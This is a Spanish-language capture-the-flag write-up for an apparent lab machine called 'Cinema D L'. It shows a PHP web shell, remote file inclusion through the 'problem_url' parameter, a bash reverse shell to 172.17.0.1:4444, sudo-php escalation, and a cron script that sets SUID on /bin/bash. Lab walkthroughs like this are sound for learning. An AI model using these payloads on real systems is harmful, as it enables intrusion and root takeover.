## Reconocimiento:

Puerto 80 : HTTP

El titulo de la web es “Cinema D L”, por lo que supongo que es un dominio:

```bash
http://cinema.dl
```

Solo encuentro un directorio para hacer una reserva a una pelicula en especifico.

Interceptando la petición con BurpSuite encuentro un parámetro raro:

```bash
problem_url...webshell.php
```

Supongo que hay una shell escondida. Estuve un rato buscando y al final di con el correcto utilizando un diccionario con palabras de la web:

```bash
http://cinema.dl/andrewgarfield
```

Dentro hay una shell.php, pero no funciona sin un parámetro vulnerable. Como está en una carpeta de uploads, intuyo que puedo subir archivos. La idea es subir un archivo para crear el parámetro vulnerable:

cmd.php

```bash
<?php
  system($_GET["cmd"]);
?>
```

Abro un server con Python:

```bash
python3 -m http.server 80
```

Y aprovechando el url defectuoso subo el archivo:

```bash
http://cinema.dl/reservation.php?problem_url=http://172.17.0.1:80/cmd.php
```

Luego me pongo en escucha:

```bash
nc -lnvp 4444
```

y ejecuto en la web:

```bash
http://cinema.dl/andrewgarfield/cmd.php?cmd=bash -c 'exec bash -i %26>/dev/tcp/172.17.0.1/4444 <%261'
```

Recibo conexión.

## Escalada

```bash
sudo -l
(boss) NOPASSWD: /bin/php
```

Gracias GTFO Bins:

```bash
sudo -u boss /bin/php -r 'system("/bin/bash");'
```

Logro ganar acceso, pero después de un minuto me devuelve al usuario www-data.

Revisando el sistema veo la carpeta /opt/update.sh con un script que hace que cualquier sesión con boss sea mitigada. 

Investigando un poco más veo que hay crontab:

```bash
ps aux

cd /var/spool/cron/crontabs
```

Me cambio rápido al usuario boss para leer la carpeta y hay un script llamado root.sh, que es el que hace que el script update.sh se ejecute cada minuto. Pero también tenemos un script llamado /tmp/script.sh que se está ejecutado pero no existe.

Sabiendo eso:

```bash
cd /tmp
nano script.sh

#!/bin/bash
chmod u+s /bin/bash
```

Le doy permisos:

```bash
chmod +x script.sh
```

Espero un minuto y ejecuto:

```bash
bash -p
```

Listo.
